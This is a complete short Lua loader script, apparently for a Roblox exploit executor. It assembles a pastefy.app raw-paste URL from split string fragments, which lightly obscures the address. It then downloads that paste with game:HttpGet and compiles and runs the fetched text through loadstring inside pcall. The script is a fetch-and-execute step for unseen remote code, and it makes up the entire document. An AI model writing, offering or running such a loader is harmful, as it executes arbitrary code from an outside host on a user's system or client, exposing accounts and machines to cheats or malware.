local _ENV = getfenv and getfenv(1) or _ENV
local a, b, c = "https", "pastefy", ".app"
local endpoint = "/swznQSU5/raw"
local url = (a .. "://" .. b .. c .. endpoint)
local response = game["HttpGet"](game, url)
local loaded = (loadstring or function() end)(response)
if typeof(loaded) == "function" then
    pcall(loaded)
end
